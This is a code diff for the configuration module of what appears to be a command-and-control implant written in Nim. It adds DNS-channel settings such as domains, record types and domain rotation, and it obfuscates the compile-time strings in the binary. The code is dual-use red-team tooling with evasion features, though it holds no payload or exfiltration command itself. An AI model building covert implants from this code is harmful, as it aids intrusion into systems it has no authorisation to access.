@@ -1,4 +1,5 @@
 import std/[strutils, os]
+import utils/strenc
 
 type
   Config* = object
@@ -18,36 +19,49 @@ type
     callbackInterval*: int
     callbackJitter*: int
     killdate*: string
-    debug*: bool
-    sleepObfuscation*: string
-    selfDelete*: bool
+    # DNS-specific fields
+    dnsServer*: string
+    domains*: string
+    recordType*: string
+    domainRotation*: string
+    maxQueryLength*: int
+    maxSubdomainLength*: int
+    failoverThreshold*: int
 
 proc getConfig*(): Config =
   ## Get configuration from compile-time environment variables
-  result.uuid = static: getEnv("UUID", "00000000-0000-0000-0000-000000000000")
-  result.profile = static: getEnv("PROFILE", "http")
-  result.callbackHost = static: getEnv("CALLBACK_HOST", "127.0.0.1")
-  result.callbackPort = static: getEnv("CALLBACK_PORT", "80")
-  result.postUri = static: getEnv("POST_URI", "data")
-  result.userAgent = static: getEnv("USER_AGENT", "Mozilla/5.0")
-  result.headers = static: getEnv("HEADERS", "")
-  result.proxyHost = static: getEnv("PROXY_HOST", "")
-  result.proxyPort = static: getEnv("PROXY_PORT", "")
-  result.proxyUser = static: getEnv("PROXY_USER", "")
-  result.proxyPass = static: getEnv("PROXY_PASS", "")
-  result.aesKey = static: getEnv("AESPSK", "")
+  result.uuid = static: getEnv(obf("UUID"), "")
+  result.profile = static: getEnv(obf("PROFILE"), "")
+  result.callbackHost = static: getEnv(obf("CALLBACK_HOST"), "")
   
-  let eec = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "true")
+  # TCP uses PORT, HTTP uses CALLBACK_PORT
+  let port = static: getEnv(obf("PORT"), "")
+  let callbackPort = static: getEnv(obf("CALLBACK_PORT"), "")
+  result.callbackPort = if callbackPort.len > 0: callbackPort elif port.len > 0: port else: ""
+  
+  result.postUri = static: getEnv(obf("POST_URI"), "")
+  result.userAgent = static: getEnv(obf("USER_AGENT"), "")
+  result.headers = static: getEnv(obf("HEADERS"), "")
+  result.proxyHost = static: getEnv(obf("PROXY_HOST"), "")
+  result.proxyPort = static: getEnv(obf("PROXY_PORT"), "")
+  result.proxyUser = static: getEnv(obf("PROXY_USER"), "")
+  result.proxyPass = static: getEnv(obf("PROXY_PASS"), "")
+  result.aesKey = static: getEnv(obf("AESPSK"), "")
+  
+  let eec = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "")
   result.encryptedExchange = eec.toLowerAscii in ["true", "t"]
   
-  result.callbackInterval = static: parseInt(getEnv("CALLBACK_INTERVAL", "10"))
-  result.callbackJitter = static: parseInt(getEnv("CALLBACK_JITTER", "10"))
-  result.killdate = static: getEnv("KILLDATE", "2099-12-31")
+  # Default to 10 and 23 if not provided (TCP doesn't use these)
+  result.callbackInterval = static: parseInt(getEnv(obf("CALLBACK_INTERVAL"), "10"))
+  result.callbackJitter = static: parseInt(getEnv(obf("CALLBACK_JITTER"), "23"))
+  result.killdate = static: getEnv(obf("KILLDATE"), "")
   
-  let debugStr = static: getEnv("DEBUG", "false")
-  result.debug = debugStr.toLowerAscii in ["true", "t"]
+  # DNS-specific configuration (empty if not DNS profile)
+  result.dnsServer = static: getEnv(obf("DNS_SERVER"), "")
+  result.domains = static: getEnv(obf("DOMAINS"), "")
+  result.recordType = static: getEnv(obf("RECORD_TYPE"), "")
+  result.domainRotation = static: getEnv(obf("DOMAIN_ROTATION"), "")
+  result.maxQueryLength = static: parseInt(getEnv(obf("MAX_QUERY_LENGTH"), "0"))
+  result.maxSubdomainLength = static: parseInt(getEnv(obf("MAX_SUBDOMAIN_LENGTH"), "0"))
+  result.failoverThreshold = static: parseInt(getEnv(obf("FAILOVER_THRESHOLD"), "0"))
   
-  result.sleepObfuscation = static: getEnv("SLEEP_OBFUSCATION", "none")
-  
-  let selfDelStr = static: getEnv("SELF_DELETE", "false")
-  result.selfDelete = selfDelStr.toLowerAscii in ["true", "t"]
